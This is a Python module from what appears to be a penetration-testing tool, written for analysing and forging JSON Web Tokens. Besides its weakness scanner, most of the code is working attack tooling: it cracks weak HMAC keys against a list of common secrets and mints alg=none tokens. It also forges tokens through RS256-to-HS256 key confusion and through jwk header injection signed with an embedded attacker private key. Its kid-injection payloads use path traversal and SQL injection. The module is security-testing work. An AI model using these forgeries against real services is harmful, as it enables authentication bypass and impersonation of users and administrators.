"""
jwtscan.py — JSON Web Token weakness analysis.

Brukal already EXTRACTED a bearer token at login and carried it on later requests, but
never looked at it. A JWT is a security decision the client can read: the header names
the algorithm, the payload names the principal, and the signature is only as strong as
the key behind it. The most damaging API auth bugs live right there.

Everything here is offline and deterministic — decoding is base64, and recovering a weak
HMAC key is arithmetic over the token's own signing input. No request is sent, so a
cracked key is proved before the target is touched at all. The active follow-up (mint a
token and see whether the server accepts it) lives in AssistSession.confirm_jwt_forgery,
so the network step stays behind the gate like every other action.
"""
from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import re
import time

_JWT_RE = re.compile(r"\beyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*")

# Keys that show up in real deployments: framework defaults, tutorial copy-paste, and
# the placeholders people mean to replace. Small on purpose — this is a "was the key
# ever chosen?" check, not a cracking rig. A hit is decisive; a miss proves nothing.
COMMON_SECRETS = (
    "secret", "secretkey", "secret_key", "SECRET_KEY", "jwt_secret", "jwtsecret",
    "JWT_SECRET", "password", "passw0rd", "changeme", "change_me", "key", "mykey",
    "private", "privatekey", "supersecret", "super_secret", "s3cr3t", "mysecret",
    "topsecret", "random", "test", "testing", "dev", "development", "debug", "local",
    "admin", "administrator", "root", "default", "example", "demo", "sample",
    "your-256-bit-secret", "your_jwt_secret", "your-secret-key", "shhhhh", "qwerty",
    "123456", "12345678", "1234567890", "abc123", "letmein", "token", "auth", "authkey",
    "signature", "hmac", "app_secret", "appsecret", "client_secret", "api_secret",
    "session_secret", "cookie_secret", "flask", "django", "express", "nodejs", "laravel",
)

_HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _b64d(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def find_tokens(text: str, limit: int = 5) -> list[str]:
    """JWTs appearing in a response body, header dump or bundle."""
    out: list[str] = []
    for m in _JWT_RE.finditer(text or ""):
        t = m.group(0)
        if t not in out and decode(t) is not None:
            out.append(t)
            if len(out) >= limit:
                break
    return out


def decode(token: str):
    """(header, payload, signing_input, signature) for a well-formed JWT, else None.
    Pure parsing of untrusted text; never raises."""
    parts = (token or "").split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64d(parts[0]))
        payload = json.loads(_b64d(parts[1]))
        signature = _b64d(parts[2]) if parts[2] else b""
    except (ValueError, binascii.Error, UnicodeDecodeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload, f"{parts[0]}.{parts[1]}".encode(), signature


def describe(token: str) -> str:
    """A structural digest of a token: what it IS, carrying nothing you could send.

    The header's algorithm and type, the payload's claim KEYS in order, whether an `exp`
    is present, and the signature length. **No claim VALUE appears** — the subject, the
    role's value and the signature bytes are the parts worth stealing, and none of them
    is needed to see why an exposed token matters.

    This exists because masking a discovered credential must not shred the evidence for
    it. `scan_token` below reports WEAKNESSES, and a token can be damaging without
    tripping one of them: run 2C4's leaked admin JWT was RS256 with a real signature, so
    the only weakness it declared was a missing `exp`, and once the value was masked the
    record no longer said what algorithm it used or what it claimed to be. A reader has
    to be able to reconstruct why it is a finding from the artifact alone.

    Empty string for anything that does not decode — the caller records nothing rather
    than describing a value it could not parse."""
    parsed = decode(token)
    if parsed is None:
        return ""
    header, payload, _si, signature = parsed
    keys = ", ".join(str(k) for k in payload) or "(none)"
    return (f"alg={header.get('alg', '?')} typ={header.get('typ', '?')}; "
            f"claim keys: {keys}; "
            f"{'exp present' if 'exp' in payload else 'NO exp claim'}; "
            f"signature {len(signature)} bytes")


def crack_hmac_secret(token: str, extra_secrets=()) -> str | None:
    """Recover the signing key of an HS256/384/512 token by trying weak candidates
    against its OWN signature. Entirely offline: no request, no side effect, and a hit
    is cryptographic proof rather than a heuristic — the key reproduces the signature."""
    parsed = decode(token)
    if parsed is None:
        return None
    header, _payload, signing_input, signature = parsed
    algo = _HMAC_ALGS.get(str(header.get("alg", "")).upper())
    if algo is None or not signature:
        return None
    for candidate in (*COMMON_SECRETS, *extra_secrets):
        mac = hmac.new(candidate.encode(), signing_input, algo).digest()
        if hmac.compare_digest(mac, signature):
            return candidate
    return None


def sign(header: dict, payload: dict, secret: str) -> str:
    """Mint a token — used to prove a recovered key actually works against the server."""
    algo = _HMAC_ALGS.get(str(header.get("alg", "")).upper(), hashlib.sha256)
    h = _b64e(json.dumps(header, separators=(",", ":")).encode())
    p = _b64e(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), algo).digest()
    return f"{h}.{p}.{_b64e(sig)}"


def none_token(header: dict, payload: dict) -> str:
    """An UNSIGNED token from explicit claims, `alg` forced to none. The caller supplies a
    fresh `exp` when it wants one; here we only re-encode. Accepted by any implementation
    that trusts the header's choice of algorithm (the crAPI challenge-15 forge)."""
    h = _b64e(json.dumps({**header, "alg": "none"}, separators=(",", ":")).encode())
    p = _b64e(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def alg_none_variant(token: str) -> str | None:
    """The same claims with the signature stripped and `alg` set to none."""
    parsed = decode(token)
    if parsed is None:
        return None
    header, payload, _si, _sig = parsed
    return none_token(header, payload)


def _der_len(n: int) -> bytes:
    """ASN.1 DER length encoding."""
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def _der_int(raw: bytes) -> bytes:
    """A DER INTEGER from a big-endian unsigned byte string (adds a leading 0 when the
    top bit is set, so it is not read as negative)."""
    raw = raw.lstrip(b"\x00") or b"\x00"
    if raw[0] & 0x80:
        raw = b"\x00" + raw
    return b"\x02" + _der_len(len(raw)) + raw


def _der_seq(*chunks: bytes) -> bytes:
    body = b"".join(chunks)
    return b"\x30" + _der_len(len(body)) + body


def _pem(der: bytes, label: str) -> str:
    b64 = base64.b64encode(der).decode()
    lines = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return f"-----BEGIN {label}-----\n{lines}\n-----END {label}-----\n"


# rsaEncryption OID 1.2.840.113549.1.1.1, then NULL — the AlgorithmIdentifier for SPKI.
_RSA_ALG_ID = bytes.fromhex("300d06092a864886f70d0101010500")


def jwk_to_pems(jwk: dict) -> list[str]:
    """An RSA JWK ({"n","e"} base64url) rendered as PEM public keys, PURE PYTHON (no
    `cryptography` dependency). Returns BOTH common encodings, because the RS256->HS256
    confusion attack must present the SAME public-key bytes the server verifies with, and
    a server may load either:
      - SPKI / X.509 SubjectPublicKeyInfo (`-----BEGIN PUBLIC KEY-----`) — the modern
        default (PyJWT, jose, Java's X509EncodedKeySpec);
      - PKCS#1 RSAPublicKey (`-----BEGIN RSA PUBLIC KEY-----`) — older stacks.
    Both are tried as the HMAC key in the forge; whichever the server used matches."""
    try:
        n = int.from_bytes(_b64d(jwk["n"]), "big")
        e = int.from_bytes(_b64d(jwk["e"]), "big")
    except Exception:
        return []
    if n <= 0 or e <= 0:
        return []
    pkcs1 = _der_seq(_der_int(n.to_bytes((n.bit_length() + 7) // 8, "big")),
                     _der_int(e.to_bytes((e.bit_length() + 7) // 8, "big")))
    spki = _der_seq(_RSA_ALG_ID, b"\x03" + _der_len(len(pkcs1) + 1) + b"\x00" + pkcs1)
    return [_pem(spki, "PUBLIC KEY"), _pem(pkcs1, "RSA PUBLIC KEY")]


# A FIXED attacker-owned RSA-2048 keypair, generated once offline and embedded so no
# key generation (and therefore no `cryptography` dependency) happens at runtime. It is
# the key WE control: the jwk/kid forges below embed its PUBLIC half in the token and sign
# with its PRIVATE half, so a server that trusts a key the token names verifies OUR
# signature. It signs nothing real — only proof tokens against an authorised target.
_ATTACKER_N = 0xc33702cb891df4aa1079a87fb449be2d409b015d296560034eab918c7af79012cce88199525e9d888606696362fe156fe838348dc24e26d3d89e7796ecff122cb43b241ff4bdbd99e8eb1d4bec892172e3d49a69eacc1091bd28950dc2224b04d1235a1ea6d19ca498ad5a65ef187c6837b82705c5562fdae11e0f352170367640ae72941ba7932294a1243560545dc8e905c2647ad01e1abb2ec2eaedc86eda77b0f22f7aa32dcb18bec2e9a54b1f4af6fa7bb3b8585302a6117ab1dfb82ad03aa189e4e452640fb87cd32e7ca30a843d19265c9d5ba88d6512d1173087d4758f0714be7d7dba9a331f88c49b48267615be2bed030cac5e81f8516b118669e5
_ATTACKER_E = 65537
_ATTACKER_D = 0x1bc2eefad2fd179637d1954cd3eec8c4d6b3347673349f7ad8ed3d3da51f1fb60cbde3f051ee72a8bfa699c63085c1b6b0678dd1bb18321d5e68eac8e3db4252692f1fec0b7a10449b03149f7f7be0edddc8964d09bf0b7c2e525f201dc392b794a65a629186ada81aae4c74c293d0dd614f26fd831ac6a371f03c6969dff35e8df4b777d24b7b4422f2398570058a0517269023a298fab326035c94654c68935abb3bac1967dbb3ddaafec52ce67a3b3520e8bbe7742e41bb5beeee1f4d571b025886d634958784553a7158a370d1dd17cc286cb1f6cc3ec9429990f2fddb206b62230626be48f8314775feb5dd94cfaf29ec04759a1299682c8d0ac2804ae1

# SHA-256 DigestInfo prefix (the ASN.1 that precedes the hash in an RSASSA-PKCS1-v1_5
# signature) — RFC 8017 §9.2.
_SHA256_DIGEST_INFO = bytes.fromhex("3031300d060960864801650304020105000420")


def _rs256_sign_with_attacker_key(signing_input: bytes) -> bytes:
    """RSASSA-PKCS1-v1_5 over SHA-256 with the embedded attacker private key — pure Python
    (RFC 8017 EMSA-PKCS1-v1_5 padding, then modular exponentiation). This is normal RSA
    signing done by hand; only the KEY is ours."""
    k = (_ATTACKER_N.bit_length() + 7) // 8
    t = _SHA256_DIGEST_INFO + hashlib.sha256(signing_input).digest()
    ps = b"\xff" * (k - len(t) - 3)                      # pad to a full modulus block
    em = b"\x00\x01" + ps + b"\x00" + t
    m = int.from_bytes(em, "big")
    s = pow(m, _ATTACKER_D, _ATTACKER_N)
    return s.to_bytes(k, "big")


def _attacker_public_jwk() -> dict:
    """The public half of the embedded key as an RSA JWK — what an attacker plants in the
    token header for a server to (wrongly) verify against."""
    def _uint(v: int) -> str:
        return _b64e(v.to_bytes((v.bit_length() + 7) // 8, "big"))
    return {"kty": "RSA", "n": _uint(_ATTACKER_N), "e": _uint(_ATTACKER_E)}


def jwk_injection_token(token: str) -> str | None:
    """The `jwk` header-injection forge (CVE class; PortSwigger "JWT header injections").

    A server that reads the verification key from the TOKEN's own `jwk` header — instead of
    a trusted key store — will verify against whatever public key the attacker embeds. Here
    we plant OUR public key in the header and sign the same claims (RS256) with OUR private
    key, so a claim the server never issued is accepted. Only meaningful for an asymmetric
    original; an HS token names no key to inject. Returns None if the token does not decode."""
    parsed = decode(token)
    if parsed is None:
        return None
    header, payload, _si, _sig = parsed
    if not str(header.get("alg", "")).upper().startswith(("RS", "ES", "PS")):
        return None
    hdr = {**header, "alg": "RS256", "jwk": _attacker_public_jwk()}
    hdr.pop("kid", None)                                  # our jwk is the key, not a stored kid
    h = _b64e(json.dumps(hdr, separators=(",", ":")).encode())
    p = _b64e(json.dumps({**payload, "exp": int(time.time()) + 3600},
                         separators=(",", ":")).encode())
    sig = _rs256_sign_with_attacker_key(f"{h}.{p}".encode())
    return f"{h}.{p}.{_b64e(sig)}"


# kid values that make the server verify against a key the attacker can predict. Each pairs
# a header `kid` with the HMAC secret the server would then load for it.
_KID_INJECTIONS = (
    # Path traversal to an empty/predictable file -> the "key" is that file's bytes.
    ("../../../../../../../../dev/null", b""),
    ("../../../../../../../../../../dev/null", b""),
    ("/dev/null", b""),
    # SQL injection in a `kid` looked up in a DB -> UNION returns an attacker-known key.
    ("nonexistent' UNION SELECT 'brukal_kid_key'-- -", b"brukal_kid_key"),
    ("x' UNION SELECT 'AA'-- -", b"AA"),
)


def kid_injection_tokens(token: str) -> list[tuple[str, str]]:
    """(kid, forged_token) — the `kid` header-injection forge. When the server uses the
    header's `kid` to LOCATE its verification key (a file path, a DB row), a traversal to an
    empty file or a SQL injection makes the key a value the attacker controls; the token is
    then HS256-signed with that predictable key. Independent of the original algorithm: the
    forced `alg` is HS256 and the secret is whatever the poisoned lookup yields."""
    parsed = decode(token)
    if parsed is None:
        return []
    header, payload, _si, _sig = parsed
    out: list[tuple[str, str]] = []
    for kid, key in _KID_INJECTIONS:
        hdr = {**header, "alg": "HS256", "kid": kid}
        h = _b64e(json.dumps(hdr, separators=(",", ":")).encode())
        p = _b64e(json.dumps({**payload, "exp": int(time.time()) + 3600},
                             separators=(",", ":")).encode())
        sig = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
        out.append((kid, f"{h}.{p}.{_b64e(sig)}"))
    return out


def confusion_tokens(token: str, public_pems) -> list[tuple[str, str]]:
    """(pem, forged_token) — the RS256->HS256 confusion forge. The token is re-signed as
    HS256 using each candidate public-key PEM as the HMAC secret. A server that does not
    pin the algorithm verifies the attacker's HMAC with its own public key (which is not
    secret), so a claim it never issued is accepted. Only meaningful when the original
    token is an ASYMMETRIC alg (RS/ES/PS); an HS token is already symmetric."""
    parsed = decode(token)
    if parsed is None:
        return []
    header, payload, _si, _sig = parsed
    if not str(header.get("alg", "")).upper().startswith(("RS", "ES", "PS")):
        return []
    out = []
    for pem in public_pems or ():
        if not pem:
            continue
        forged = sign({**header, "alg": "HS256"},
                      {**payload, "exp": int(time.time()) + 3600}, pem)
        out.append((pem, forged))
    return out


# Claims that should never be decided by something the client holds and can rewrite.
_PRIVILEGE_CLAIMS = ("admin", "is_admin", "isadmin", "role", "roles", "scope", "scopes",
                     "permissions", "is_staff", "superuser", "level", "group")
_SECRET_CLAIMS = ("password", "passwd", "pwd", "secret", "api_key", "apikey", "token",
                  "credit_card", "ssn")


def scan_token(token: str, extra_secrets=()) -> list[tuple[str, str, str]]:
    """(severity, label, evidence) for the weaknesses a token reveals about itself.

    A recovered key is CRITICAL and certain: with it an attacker mints any token, so
    every authorisation decision downstream is theirs. The rest are what the token
    discloses about how the system reasons — no request required for any of it."""
    parsed = decode(token)
    if parsed is None:
        return []
    header, payload, _si, signature = parsed
    hits: list[tuple[str, str, str]] = []
    alg = str(header.get("alg", "")).upper()

    if alg in ("NONE", ""):
        hits.append(("critical", "JWT accepts the 'none' algorithm",
                     f"header declares alg={header.get('alg')!r} — the token is unsigned"))
    if not signature and alg not in ("NONE", ""):
        hits.append(("high", "JWT carries no signature",
                     f"alg={alg} but the signature segment is empty"))

    secret = crack_hmac_secret(token, extra_secrets)
    if secret:
        hits.append(("critical", "JWT signed with a guessable secret",
                     f"the {alg} signing key is {secret!r} — recovered offline from the "
                     f"token's own signature, so any token (any user, any role) can be "
                     f"minted"))

    exp = payload.get("exp")
    if exp is None:
        hits.append(("medium", "JWT has no expiry",
                     "no `exp` claim — a stolen token stays valid forever"))
    elif isinstance(exp, (int, float)):
        iat = payload.get("iat")
        if isinstance(iat, (int, float)) and exp - iat > 60 * 60 * 24 * 30:
            days = int((exp - iat) / 86400)
            hits.append(("low", "JWT lifetime is excessive",
                         f"valid for {days} days after issue"))
        elif exp < time.time() - 86400:
            hits.append(("low", "JWT is long expired",
                         "captured token is stale; findings from it may not reproduce"))

    priv = [k for k in payload if str(k).lower() in _PRIVILEGE_CLAIMS]
    if priv:
        hits.append(("low", "JWT carries privilege claims",
                     f"authorisation data in the token ({', '.join(map(str, priv))}) — "
                     f"decisive only if the signature is sound"))
    leaked = [k for k in payload if str(k).lower() in _SECRET_CLAIMS]
    if leaked:
        hits.append(("high", "JWT payload contains sensitive data",
                     f"claims {', '.join(map(str, leaked))} are readable by anyone "
                     f"holding the token — a JWT payload is not encrypted"))
    return hits


CONFIRMED_JWT_LABELS = frozenset({
    "JWT signed with a guessable secret",
    "JWT accepts the 'none' algorithm",
    "JWT carries no signature",
    "JWT payload contains sensitive data",
    "JWT has no expiry",
})
